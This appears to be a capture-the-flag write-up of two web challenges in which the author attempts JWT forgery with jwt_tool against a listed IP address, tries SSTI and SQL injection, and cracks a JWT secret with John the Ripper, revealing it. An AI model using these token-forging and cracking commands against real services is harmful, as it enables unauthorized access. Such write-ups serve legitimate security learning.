## Very Secure App [Web]

All secrets become clear

http://109.107.157.141:8000/


It seems like a JWT token challenge. Once we access the link we have a resgiter/login form and after submitting we get a session with a role user. The flag is in the /flag but we need admin role:

![1720130171944](image/writeup/1720130171944.png)

![1720130163460](image/writeup/1720130163460.png)

Tried to brute force the secret with JWT-cracker and the rockyou.txt wordlist but took so much time i stoped.

Tried all the attacks with jwt_tool but they didnt seem to work:

Token with:

username: admin and role: user

jwt_tool -t http://109.107.157.141:8000/flag -rc "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIifQ.ysbwIYSovR_XiG5_B6IZxq-9sNvTmQQXk4ho8g6S3B8" -M pb -cv "Sorry, only admin can access the flag."

username: admin and role: admin signed with empty string

jwt_tool -t http://109.107.157.141:8000/flag -rc "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.1C4B-OmDfkegwoyCPmciXvk8G-TyS7Suv5f09nBJ5_A" -M pb -cv "Invalid"

Tried SSTI in the username but didnt seem to work.
Tried sql injection on the username and password but didnt seem to work too.

## Guest [Web]

Find out the secret of this site

http://109.107.157.141:5000
guest:guest


We get credentials.
After login we only get the following screen:

![1720130519842](image/writeup/1720130519842.png)

We have a jwt token with a sus data variable, "isAdmin":

![1720130611416](image/writeup/1720130611416.png)

The jwt token secret is crackable by using the following commands:

```shell
# Save the JWT token to a file

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjpmYWxzZX0.wCcmSnz9QshOZboVDlYEI2LjkSk_Su4CYoS7DLqgXnY" > web3.txt

# Use John the Ripper to crack the token
john web3.txt

# After John finishes, display the cracked result
john web3.txt --show

The output should reveal the secret: wwwzk
```
